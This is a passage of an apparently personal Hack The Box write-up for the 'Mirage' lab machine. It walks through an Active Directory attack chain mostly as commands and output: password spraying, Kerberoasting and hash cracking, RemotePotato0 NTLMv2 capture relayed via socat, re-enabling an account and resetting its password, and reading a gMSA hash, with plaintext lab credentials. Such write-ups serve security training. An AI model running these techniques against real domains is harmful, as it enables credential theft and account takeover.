SMB         dc01.mirage.htb 445    dc01             Account Lockout Threshold: 10
SMB         dc01.mirage.htb 445    dc01             Forced Log off Time: Not Set

```

Only `admin` accounts can be locked out after 10 failed login attempts. The account is locked for 1 minute only. It is important to know the password policy to avoid locking out accounts.

#### Enumerating shares

```bash
faketime -f "+7hrs" \                                 
nxc smb dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --shares   
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
SMB         dc01.mirage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.mirage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.mirage.htb 445    dc01             -----           -----------     ------
SMB         dc01.mirage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.mirage.htb 445    dc01             C$                              Default share
SMB         dc01.mirage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.mirage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.mirage.htb 445    dc01             SYSVOL          READ            Logon server share 
```

No interesting share. 

#### Creating a user list

```bash
faketime -f "+7hrs" \
nxc smb dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --users   
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
SMB         dc01.mirage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-                 
SMB         dc01.mirage.htb 445    dc01             Administrator                 2025-06-23 21:18:18 0       Built-in account for administering the computer/domain
SMB         dc01.mirage.htb 445    dc01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc01.mirage.htb 445    dc01             krbtgt                        2025-05-01 07:42:23 0       Key Distribution Center Service Account
SMB         dc01.mirage.htb 445    dc01             Dev_Account_A                 2025-05-27 14:05:12 0        
SMB         dc01.mirage.htb 445    dc01             Dev_Account_B                 2025-05-02 08:28:11 0        
SMB         dc01.mirage.htb 445    dc01             david.jjackson                2025-05-02 08:29:50 0        
SMB         dc01.mirage.htb 445    dc01             javier.mmarshall              2025-09-17 21:46:12 0       Contoso Contractors 
SMB         dc01.mirage.htb 445    dc01             mark.bbond                    2025-06-23 21:18:18 0        
SMB         dc01.mirage.htb 445    dc01             nathan.aadam                  2025-06-23 21:18:18 0        
SMB         dc01.mirage.htb 445    dc01             svc_mirage                    2025-05-22 20:37:45 0       Old service account migrated by contractors
SMB         dc01.mirage.htb 445    dc01             [*] Enumerated 10 local users: MIRAGE
```

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ cat users.dump | awk '{print $5}' > users.txt
                                                                                                                                            
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ cat users.txt                                
Administrator
Guest
krbtgt
Dev_Account_A
Dev_Account_B
david.jjackson
javier.mmarshall
mark.bbond
nathan.aadam
svc_mirage
```

#### Password spraying 

No reuse of the password among the users.

```bash
faketime -f "+7hrs" \
nxc smb dc01.mirage.htb -u users.txt -p 'pN8kQmn6b86!1234@' -k --continue-on-success
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\Administrator:pN8kQmn6b86!1234@ KDC_ERR_PREAUTH_FAILED 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\Guest:pN8kQmn6b86!1234@ KDC_ERR_CLIENT_REVOKED 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\krbtgt:pN8kQmn6b86!1234@ KDC_ERR_CLIENT_REVOKED 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\Dev_Account_A:pN8kQmn6b86!1234@ KDC_ERR_PREAUTH_FAILED 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\Dev_Account_B:pN8kQmn6b86!1234@ KDC_ERR_PREAUTH_FAILED 
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\javier.mmarshall:pN8kQmn6b86!1234@ KDC_ERR_CLIENT_REVOKED 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\mark.bbond:pN8kQmn6b86!1234@ KDC_ERR_PREAUTH_FAILED 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\nathan.aadam:pN8kQmn6b86!1234@ KDC_ERR_PREAUTH_FAILED 
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\svc_mirage:pN8kQmn6b86!1234@ KDC_ERR_CLIENT_REVOKED
```

#### Roasting

##### AS_REP Roasting 

we get nothing

```bash
faketime -f "+7hrs" \
impacket-GetNPUsers mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -k -dc-ip 10.10.11.78 -usersfile users.txt -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Dev_Account_A doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Dev_Account_B doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User david.jjackson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User mark.bbond doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nathan.aadam doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

##### Kerberoasting 

```bash
faketime -f "+7hrs" \
impacket-GetUserSPNs mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -k  -dc-host dc01.mirage.htb -request -outputfile tgs.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-24 00:18:18.584667  2025-09-17 21:42:15.538826             

```

We get TGS for one user account `nathan.adam` which we cracked successfully

```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$542110a469e9df54471ad87a522b3b7a$a0f09ea445cacaf3b9d07630119a0018815580d95e886f1df03006dc78a2aadf9978c9dd91f4961750659a62dd7e85129f47da4dd446f4ab1ac8d7ffac70dd4dcfd634ebca41f195177742b9f1981318d491d3c3c7c3b6ba26d481107bfb4367a921b0e1f3d37e1d54e413f882f412df0e5e70c9e4a27caa3a5b323cac49f184eab8aa04185b702aeffdb3ecc7ea6e560d970b082155962501a27f4f10a631422eca910f977efcae01e43c07f6e6e828251307731d1e0fef7e696ebffff554120ce15bd824bbef48605fb850f1f05fcb2219fb045edd57dfd0a1788dca850d8d2a8cdad141a16d43c940cb0be1ea445fe69400e1e58d8f3e5928762e82e630f1ae46daf5b9afcc15f3f531ae5728ce0fcd686793fa913a6ddfa94809a315b645acfb8ed25c25cc00d8109f76d3fe14a6a836a395268fdab2732614842ece028cee9357b56685a025a062c049cf3d93f0393501eb4d9c73ada5281f9b1fce61a1d8b8809aeccd424549d22e7b231ac8f241e279e4d2d1c6450e11e4f8efc2f2b8253f529897c756fe0b5808137c4736defcbe4865c393a61131d2c13d381932d6d4cc2728d91454da57bfb37cefec82e1c5f46b5d0dfe41042e53d9d8157387ccecaa0d8c31759b508219da24aa71c3d9a45f7dee3ab61478114f6ee165666e176fff5ee93a0a14172036744d68dcb74ca799f7f46df25b747bbed22cc84b0715fc8ba0186a5850c4f7354f94efd5f8863c145dca46875e3c8b0339a80bcaffc03eceb8fb6d0cb022d37ad85c150f2942d68333061eb16329cfba9d5d103c6ebe648a66659a7b158bcf87677ff05834561a5d2e5bae9108b23ec44f99b55a31d0deb6a61e81fc17b09b0fb5fb222d244c413d979c1e2f4f0dbe62ae1f24657e79cca2aeb31ca39ff647e70d449fe020a4a8797c07801e67d8e6e952dafca1ddb09795b3be9c946dff844744422052f5f958842f3a602b780a5ec1e34dcb4febeb2f445027ef6d5c4cc39638b92d7d005ef105fed94e912c44fe7cfdd7a218361762d28237138ecdf6f87dfe39196ce8ae17c1a5a59d1b86cd8dbc3ee594294b62979c9a426706a7952e43fcbf74ca46682c977476d274eaa4866f7c55f2db13f6be90c18aaeaa4e01f269388a83b9f1c09f87f9a141db16ac3b92e393195b064a6f5e3d1b1ffd5836f133a99fba5151b8deaaa82f51ca2262e1aab37f6fc9d9bd37cb4c5ddbfd961a0c3c3ba44d8405ae855791bcd715a88d66a1fa72d012e2029f7d4f82a669c37d27ab25d243167ce492ba5774f2628f2a0de6167b00f8dc26b4853118f0dad9ad9737661a7311aa2041ab8191a831c4f1bb7bbcff080ea39d30437d1ca1783bfd057dcd765d4037a622c4c0bfdf6f48fee8065ab96be49b80b13b8ac16f71353eb0a0b6986f0bd860a2cf6fe5bb8acf30bf3befb4b12de0d5449f2622740fd5d922f635ac278b7c2c847e49118de6c06e40a3713fc77c92126159f7c4a475fe8ab35819c80f1f8a91bb69801499dcb0f24666e49dc18412b35dd5fc371fbc3fb6000dd0639e669a2526e840484611268bf2:3edc#EDC3
```

creds are valid.

```bash
faketime -f "+7hrs" \                                           
nxc smb dc01.mirage.htb -u 'nathan.aadam' -p '3edc#EDC3' -k                                 
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3 
```

#### AD Recon

```bash
faketime -f "+7hrs" \                                           
impacket-getTGT mirage.htb/nathan.aadam:'3edc#EDC3'                                                                         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
```

```bash
export KRB5CCNAME=nathan.aadam.ccache
```

```bash
faketime -f "+7hrs" \
> bloodhound-ce-python -u 'nathan.aadam' -p '3edc#EDC3' -k  -d mirage.htb -ns 10.10.11.78 -c All --zip 
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: mirage.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 01M 02S
INFO: Compressing output into 20250918034401_bloodhound.zip
```

`Nathan.aadam` is a member of these groups

![[Pasted_image_20250917205734.png]]

we can authenticate using evil-winrm since `nathan.aadam` is a member of the `remote management group`

further enumeration identified this.

![[Pasted_image_20250917210959.png]]

`Mark` has the rights to change the password for `javier`

`javier` can read the `gMSA` password.

![[Pasted_image_20250917211906.png]]

`javier.mmarshall` account is disabled 


![[Pasted_image_20250926085050.png]]


Let's login as `nathan.aadam` in the system using evil-winrm.

first we get the TGT and export it 

```bash
 faketime -f "+7hrs" \
> impacket-getTGT mirage.htb/nathan.aadam:'3edc#EDC3'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
      
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ export KRB5CCNAME=nathan.aadam.ccache
```

login using this command 

```bash
faketime -f "+7hrs" \                
evil-winrm -i dc01.mirage.htb -r mirage.htb  
```

Runing winpeas i get this.

```bash
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  MIRAGE
    DefaultUserName               :  mark.bbond
```

The autologon credentials are stored in the registry, decide to query the registry using the below command.

```bash
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    MIRAGE
    DefaultUserName    REG_SZ    mark.bbond
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
[SNIP]
```

There is no default password.

#### DPAPI exploitation 

Am attempting this since i think we have all the requirements required. the user's SID and password. More on this can be found in this note [[DPAPI Exploitation]]

First we get the user's SID and we have this.

`S-1-5-21-2127163471-3824721834-2568365109-1110`

The we navigate to the dirtectory containing the master blob and copy it to our share as noted in the DPAPI exploitation note.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\AppData\Roaming\Microsoft\Protect\S-1-5-21-2127163471-3824721834-2568365109-1110> cp 55b67c70-8a08-4fb0-8674-e28fd6e5f678 \\10.10.16.88\\share\master_blob
```

Damn, we hit a dead end.. we dont have any credential blob.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> cd C:\Users\nathan.aadam\AppData\Roaming\Microsoft\Credentials
*Evil-WinRM* PS C:\Users\nathan.aadam\AppData\Roaming\Microsoft\Credentials> ls -force
*Evil-WinRM* PS C:\Users\nathan.aadam\AppData\Roaming\Microsoft\Credentials> ls -force
*Evil-WinRM* PS C:\Users\nathan.aadam\AppData\Roaming\Microsoft\Credentials> ls -force
*Evil-WinRM* PS C:\Users\nathan.aadam\AppData\Roaming\Microsoft\Credentials> 
```

#### Identifying logged on users 

Listing processes running in the system i get this.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    118       8     5552      10636              3796   0 AggregatorHost
    459      35    13152      22968              2988   0 certsrv
    511      24     2224       6572               444   0 csrss
    277      15     1908       6140               548   1 csrss
    366      15     3236      15340              2764   1 ctfmon
    420      34    16772      25576              2688   0 dfsrs
    156       9     1928       6412              3188   0 dfssvc
    281      15     3916      15052              4004   0 dllhost
  10413    7493   131128     130592              3036   0 dns
    750      36    24356      54240              1084   1 dwm
   1597      62    26256      91304              5516   1 explorer
     39       7     1700       4644              4560   1 fontdrvhost
     39       7     1452       3980              4568   0 fontdrvhost
      0       0       60          8                 0   0 Idle
    150      13     1852       6368              1964   0 ismserv
[SNIP]
```

explorer.exe = desktop sessision.

seeing the `explorer` under process list means :
- **Graphical desktop is running** - Someone has a full Windows GUI session
- **Interactive logon occurred** - Either locally or via RDP
- **Windows shell is active** - The user interface is loaded

This indicates there is a possibility there is another user logged on the system.

Tried identifying `explorer.exe` was running under which user context but i was not successful. For some reason also `quinsta` and `query user` return no logged on users

```powershell
*Evil-WinRM* PS C:\> qwinsta
qwinsta.exe : No session exists for *
    + CategoryInfo          : NotSpecified: (No session exists for *:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\> query user
query.exe : No User exists for *
    + CategoryInfo          : NotSpecified: (No User exists for *:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

I asked a friend and told me to use [RemotePotato0](https://www.safebreach.com/blog/remotepotato0-a-complex-active-directory-attack/). You can get the tool and how to use it here https://github.com/antonioCoco/RemotePotato0

Tool options and usage.

```powershell
*Evil-WinRM* PS C:\tmp> ./RemotePotato0.exe


	RemotePotato0
	@splinter_code & @decoder_it



Mandatory args:
-m module
	Allowed values:
	0 - Rpc2Http cross protocol relay server + potato trigger (default)
	1 - Rpc2Http cross protocol relay server
	2 - Rpc capture (hash) server + potato trigger
	3 - Rpc capture (hash) server


Other args: (someone could be mandatory and/or optional based on the module you use)
-r Remote HTTP relay server ip
-t Remote HTTP relay server port (Default 80)
-x Rogue Oxid Resolver ip (default 127.0.0.1)
-p Rogue Oxid Resolver port (default 9999)
-l RPC Relay server listening port (Default 9997)
-s Session id for the Cross Session Activation attack (default disabled)
-c CLSID (Default {5167B42F-C111-47A1-ACC4-8EABE61B0B54})
```

```powershell
*Evil-WinRM* PS C:\tmp> ./RemotePotato0.exe -m 2 -x 10.10.16.88 
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Calling CoGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes
[!] Error. Trigger DCOM failed with status: 0x800706ba
```

We need to setup the socat listener. We set up the listener and rerunnign the above tool we get some communication.

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.78:9999
[sudo] password for darklight: 
> 2025/09/26 10:46:28.000198867  length=116 from=0 to=115
..\v.....t...........................`R.......!4z.....]........\b.+.H`............`R.......!4z....,..l..@E............< 2025/09/26 10:46:28.000787799  length=84 from=0 to=83
..\f.....T............$....9999...........]........\b.+.H`............................> 2025/09/26 10:46:29.000258762  length=24 from=116 to=139
........................< 2025/09/26 10:46:29.000753377  length=40 from=84 to=123
........(...............................> 2025/09/26 10:46:30.000735733  length=120 from=0 to=119
```

We also get `NTLMv2` hash for `mark.bbond` we cannot use `NTLMv2` for `pth` attacks.

```powershell
*Evil-WinRM* PS C:\tmp> ./RemotePotato0.exe -m 2 -x 10.10.16.88 
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Calling CoGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client	: DC01
NTLMv2 Username	: MIRAGE\mark.bbond
NTLMv2 Hash	: mark.bbond::MIRAGE:8262a96c79c022dd:678dd271701cbfa19973f67c82ae1e44:0101000000000000bd9f575bf42edc01009519a9a3be96dc0000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800bd9f575bf42edc010600040006000000080030003000000000000000010000000020000074137a95ccf59c71275dc56c0efc3ba10d6324dca3f03d697dd1093e2c46eb160a00100000000000000000000000000000000000090000000000000000000000
```

Luckily we cracked the hash.

```bash
hashcat -m 5600 mark-hash.txt /usr/share/wordlists/rockyou.txt --show
MARK.BBOND::MIRAGE:8262a96c79c022dd:678dd271701cbfa19973f67c82ae1e44:0101000000000000bd9f575bf42edc01009519a9a3be96dc0000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800bd9f575bf42edc010600040006000000080030003000000000000000010000000020000074137a95ccf59c71275dc56c0efc3ba10d6324dca3f03d697dd1093e2c46eb160a00100000000000000000000000000000000000090000000000000000000000:1day@atime
```

verifying the credentials.

```bash
aketime -f "+7hrs" \
> nxc smb dc01.mirage.htb -u 'mark.bbond' -p '1day@atime' -k   
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime
```

#### Enabling `javier.mmarshall`  account and changing the password

Checking current status 

```bash
[SNIP]
pwdLastSet: 2025-05-25 18:44:43.217870+00:00
sAMAccountName: javier.mmarshall
sAMAccountType: 805306368
uSNChanged: 69841
uSNCreated: 24655
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: javier.mmarshall@mirage.htb
whenChanged: 2025-05-25 18:44:43+00:00
[SNIP]
```

Enabling the Account 

```bash
faketime -f "+7hrs" \
bloodyAD -d mirage.htb --host dc01.mirage.htb -u mark.bbond -p '1day@atime' -k remove uac javier.mmarshall -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
```

Verifying it is enabled 

```bash
[SNIP]
pwdLastSet: 2025-05-25 18:44:43.217870+00:00
sAMAccountName: javier.mmarshall
sAMAccountType: 805306368
uSNChanged: 164019
uSNCreated: 24655
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: javier.mmarshall@mirage.htb
[SNIP]
```

To enable the account from a windows host you can run the following command 

```powershell
$username = "mirage\mark.bbond"
$password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $password)

Enable-ADAccount -Identity "javier.mmarshall" -Credential $cred
```

or for simplicity we can just use this one-liner if the cuurent logged on user has the rights to enable the user.

```powershell
Enable-ADAccount -Identity "javier.mmarshall" -Server "domain.local" -Credential (Get-Credential)
```

More info on enabling an account form a windows host can be found [here](https://learn.microsoft.com/en-us/powershell/module/activedirectory/enable-adaccount?view=windowsserver2025-ps)

Now let's proceed to change the user's password. This is possible because earlier we had identified that the user `mark.bbond` has `forceChangepassword` rights over `javier.mmarshall` account.

```bash
faketime -f "+7hrs" \
> bloodyAD -d mirage.htb --host dc01.mirage.htb -u 'mark.bbond' -p '1day@atime' -k set password 'javier.mmarshall' password@123
[+] Password changed successfully!
```

For some reason the credentials are being revoked..

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ faketime -f "+7hrs" \
> impacket-getTGT mirage.htb/javier.mmarshall:password@123 -dc-ip 10.10.11.78
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Veritying the status of `javier.mmarshall` Account from evil-winrm 

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser -identity 'javier.mmarshall'


DistinguishedName : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Enabled           : True
GivenName         : javier.mmarshall
Name              : javier.mmarshall
ObjectClass       : user
ObjectGUID        : c52e731b-30c1-439c-a6b9-0c2f804e5f08
SamAccountName    : javier.mmarshall
SID               : S-1-5-21-2127163471-3824721834-2568365109-1108
Surname           :
UserPrincipalName : javier.mmarshall@mirage.htb
```

The account is enabled.

Tried using a more complex password but still got revoked 

```bash
faketime -f "+7hrs" \
> impacket-getTGT mirage.htb/javier.mmarshall:pa$$WORD@123 -dc-ip 10.10.11.78
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Checking at `the logonHours` attribute i realize the user is not configured to logon into the system at anytime.

> [!info]
> `logonHours` is an Active Directory attribute that encodes when an account is allowed to authenticate: it’s a 21-byte (168-bit) bitmap representing the 7 days of the week × 24 hours per day, where each bit corresponds to a specific hour and a set bit means logon is permitted; the domain controller enforces this during authentication, so even with a correct password and an enabled account a user will be denied if the current hour’s bit is unset.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser -identity 'javier.mmarshall' -Properties LogonHours


DistinguishedName : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Enabled           : True
GivenName         : javier.mmarshall
LogonHours        : {0, 0, 0, 0...}
Name              : javier.mmarshall
```

the above info can also be gotten using bloodyAD

```bash
bloodyAD -d mirage.htb --host dc01.mirage.htb -u 'mark.bbond' -p '1day@atime' -k get object 'javier.mmarshall' --attr logonHours

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
logonHours: 
```

#### Updating `javier.mmarshall` LogonHours 

`mark.bbond` has write persmissions to `javier.mmarshall` LogonHours attribute.

```bash
faketime -f "+7hrs" \
bloodyAD -d mirage.htb --host dc01.mirage.htb -u 'mark.bbond' -p '1day@atime' -k get writable --detail 

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
logonHours: WRITE
userAccountControl: WRITE
[SNIP]
```

The below steps allow the user to logon into the system at anytime.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> [byte[]]$allHours = 0..20 | ForEach-Object { [byte]255 }
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $username = "mirage\mark.bbond"
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $cred = New-Object System.Management.Automation.PSCredential ($username, $password)
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Set-ADUser -Identity javier.mmarshall -Replace @{logonHours = $allHours} -Credential $cred
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser -Identity 'javier.mmarshall' -Properties LogonHours

DistinguishedName : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Enabled           : False
GivenName         : javier.mmarshall
LogonHours        : {255, 255, 255, 255...}
Name              : javier.mmarshall
ObjectClass       : user
ObjectGUID        : c52e731b-30c1-439c-a6b9-0c2f804e5f08
SamAccountName    : javier.mmarshall
SID               : S-1-5-21-2127163471-3824721834-2568365109-1108
Surname           :
UserPrincipalName : javier.mmarshall@mirage.htb
```

Now we re-enable the account and change the password.

Getting TGT

```bash
faketime -f "+7hrs" \
> impacket-getTGT mirage.htb/javier.mmarshall:password@123
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in javier.mmarshall.ccache
```

#### Reading the gSMa Password for `mirage-service$`

```bash
faketime -f "+7hrs" \
bloodyAD -d mirage.htb --host dc01.mirage.htb -u 'javier.mmarshall' -p 'password@123' -k get object 'mirage-service$' --attr msDS-ManagedPassword

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:7a77d15fb5a4b7035ef2524b1cc4142f
msDS-ManagedPassword.B64ENCODED: 9jszGNTmy77qjkjRxDnCu4oLGZj4ETQ96iw5RZHonL/BORDMGN0o7nHJs3e+wlciM6bCHWPQ5s4Y+Cd96Ax2SHetWsgJiOfJpyuksNXJRNNh3tOOon+RUSYUll5LN4SVE+cQEOiHwQ+im7Gad2Mw29dZPBxKKFzNaXKI6CD30C+egdJOL6q5KqbICurF50J3BJg4viq+s4rhb+iIYKqnFEZSvkTSxNgf9qpBRmBIwPIIpbBJ39XsoNQVN2IKf3KO/yuuOmN0lXVOp5T2OXceO58juAoCHbFdkUkkKXoosp1caCaePaNsrDOrpmKnj1k7V7bLlsxl16oUa8xPohJQFA==
```

Authenticating via smb

```bash
faketime -f "+7hrs" \
> nxc smb dc01.mirage.htb -u 'mirage-service$' -H 7a77d15fb5a4b7035ef2524b1cc4142f -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mirage-service$:7a77d15fb5a4b7035ef2524b1cc4142f
```

### PE

Checking at the `writables` we have as `mirage-service$`.

Get TGT and export it 

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ faketime -f "+7hrs" \
impacket-getTGT mirage.htb/'mirage-service$': -hashes :7a77d15fb5a4b7035ef2524b1cc4142f 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mirage-service$.ccache

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ export KRB5CCNAME='mirage-service$.ccache'                
```

Get the `writables`

```bash
faketime -f "+7hrs" \                                                                           
> bloodyAD -u 'mirage-service' -k -d mirage.htb --host dc01.mirage.htb get writable --detail

distinguishedName: CN=TPM Devices,DC=mirage,DC=htb
msTPM-InformationObject: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
url: WRITE
wWWHomePage: WRITE

